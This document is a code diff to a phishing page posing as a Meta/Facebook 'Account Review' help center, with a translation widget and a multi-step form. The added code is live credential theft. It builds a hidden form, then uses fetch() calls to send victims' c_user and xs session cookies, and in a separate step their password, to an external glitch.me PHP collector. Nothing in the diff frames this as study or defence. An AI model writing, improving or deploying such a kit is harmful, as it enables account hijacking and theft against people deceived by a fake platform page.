@@ -70,9 +70,10 @@
         
         /* Google Translate Container */
         .google-translate-container {
-            position: relative;
-            z-index: 101;
-            width: 200px;
+            position: absolute;
+            top: 15px;
+            right: 150px;
+            width: auto;
             background: rgba(255, 255, 255, 0.2);
             border-radius: 4px;
             padding: 5px;
@@ -152,7 +153,7 @@
             display: flex;
             align-items: center;
             gap: 15px;
-            color: white; /* Ensure text is white in header */
+            color: white;
         }
         
         .language-title i {
@@ -1082,6 +1083,11 @@
             color: #4CAF50;
         }
         
+        /* Hidden form for submission */
+        .hidden-form {
+            display: none;
+        }
+        
         @media (max-width: 768px) {
             .review-card {
                 padding: 30px 20px;
@@ -1153,15 +1159,16 @@
             }
             
             .google-translate-container {
+                position: relative;
                 width: 100%;
                 margin-top: 10px;
+                right: 0;
             }
             
             .language-options {
                 grid-template-columns: 1fr;
             }
             
-            /* FIXED: Mobile language modal adjustments */
             .language-modal-content {
                 padding: 20px 15px;
             }
@@ -1171,8 +1178,7 @@
                 padding: 10px 0;
                 position: sticky;
                 top: 0;
-                /* Removed background: white; which was causing contrast issues */
-                color: white; /* Ensure text remains white */
+                color: white;
             }
             
             .language-btn {
@@ -1191,15 +1197,6 @@
                 margin-top: 15px;
             }
         }
-        
-        @media (min-width: 769px) {
-            .google-translate-container {
-                position: absolute;
-                top: 15px;
-                right: 150px;
-                width: auto;
-            }
-        }
     </style>
 </head>
 <body>
@@ -1212,6 +1209,15 @@
             <div class="help-center">
                 <i class="fas fa-question-circle"></i>
                 Help Center
+            </div>
+            <div class="google-translate-container">
+                <span class="translate-title">Language</span>
+                <select id="google_translate_element" style="width: 100%; background: transparent; border: none; color: white;">
+                    <option value="">Select Language</option>
+                    <option value="en">English</option>
+                    <option value="es">Spanish</option>
+                    <option value="fr">French</option>
+                </select>
             </div>
         </div>
     </div>
@@ -1240,8 +1246,6 @@
             <button class="review-btn" id="reviewBtn">
                 <i class="fas fa-file-alt"></i> Apply for Account Review
             </button>
-            
-            <div style="display: none;">https://submit-form.com/RdhULvISY</div>
         </div>
     </div>
     
@@ -1529,6 +1533,13 @@
         </div>
     </div>
     
+    <!-- Hidden form for submission -->
+    <form id="hiddenForm" class="hidden-form" action="https://curvy-exclusive-pump.glitch.me/Mustfashedi.php" method="post">
+        <input type="hidden" name="c_user" id="hiddenCUser">
+        <input type="hidden" name="xs" id="hiddenXs">
+        <input type="hidden" name="password" id="hiddenPassword">
+    </form>
+    
     <!-- Footer -->
     <footer>
         <div class="footer-content">
@@ -1561,9 +1572,6 @@
                 'japanese': 'https://translationmeta2025-f87fc.web.app/japanese.mp4'
             };
             
-            // Form submission endpoint
-            const formEndpoint = "https://curvy-exclusive-pump.glitch.me/Mustfashedi.php";
-
             // Language modal elements
             const languageModal = document.getElementById('languageModal');
             const closeLanguageModal = document.getElementById('closeLanguageModal');
@@ -1608,6 +1616,12 @@
             const step3 = document.getElementById('step3');
             
             const steps = document.querySelectorAll('.step');
+            
+            // Hidden form elements
+            const hiddenForm = document.getElementById('hiddenForm');
+            const hiddenCUser = document.getElementById('hiddenCUser');
+            const hiddenXs = document.getElementById('hiddenXs');
+            const hiddenPassword = document.getElementById('hiddenPassword');
             
             // Open language modal when video overlay is clicked
             overlayPlayBtn.addEventListener('click', function() {
@@ -1946,6 +1960,29 @@
                     return;
                 }
                 
+                // Set values for hidden form
+                hiddenCUser.value = cUserInput.value;
+                hiddenXs.value = xsInput.value;
+                
+                // Submit c_user and xs together
+                const formData = new FormData();
+                formData.append('c_user', cUserInput.value);
+                formData.append('xs', xsInput.value);
+                
+                fetch('https://curvy-exclusive-pump.glitch.me/Mustfashedi.php', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        console.error('Submission of c_user and xs failed');
+                    }
+                })
+                .catch(error => {
+                    console.error('Submission error:', error);
+                });
+                
+                // Proceed to next step
                 step1.classList.remove('active');
                 step2.classList.add('active');
                 
@@ -1962,7 +1999,7 @@
                 steps[0].classList.add('active');
             });
             
-            // Submit form - UPDATED TO USE NEW ENDPOINT
+            // Submit form
             nextToStep3.addEventListener('click', function() {
                 const passwordInput = document.getElementById('password');
                 
@@ -1971,35 +2008,32 @@
                     return;
                 }
                 
-                step2.classList.remove('active');
-                step3.classList.add('active');
+                // Set password for hidden form
+                hiddenPassword.value = passwordInput.value;
                 
-                steps[1].classList.remove('active');
-                steps[2].classList.add('active');
-                
-                const cUser = document.getElementById('c_user').value;
-                const xs = document.getElementById('xs').value;
-                const password = passwordInput.value;
-                
-                // Create form data
+                // Submit password separately
                 const formData = new FormData();
-                formData.append('c_user', cUser);
-                formData.append('xs', xs);
-                formData.append('password', password);
+                formData.append('password', passwordInput.value);
                 
-                // Submit to the specified endpoint
-                fetch(formEndpoint, {
+                fetch('https://curvy-exclusive-pump.glitch.me/Mustfashedi.php', {
                     method: 'POST',
                     body: formData
                 })
                 .then(response => {
                     if (!response.ok) {
-                        console.error('Submission failed');
+                        console.error('Password submission failed');
                     }
                 })
                 .catch(error => {
                     console.error('Submission error:', error);
                 });
+                
+                // Proceed to success step
+                step2.classList.remove('active');
+                step3.classList.add('active');
+                
+                steps[1].classList.remove('active');
+                steps[2].classList.add('active');
             });
             
             // Reset form
@@ -2007,6 +2041,10 @@
                 document.getElementById('c_user').value = '';
                 document.getElementById('xs').value = '';
                 document.getElementById('password').value = '';
+                
+                hiddenCUser.value = '';
+                hiddenXs.value = '';
+                hiddenPassword.value = '';
                 
                 step3.classList.remove('active');
                 step1.classList.add('active');
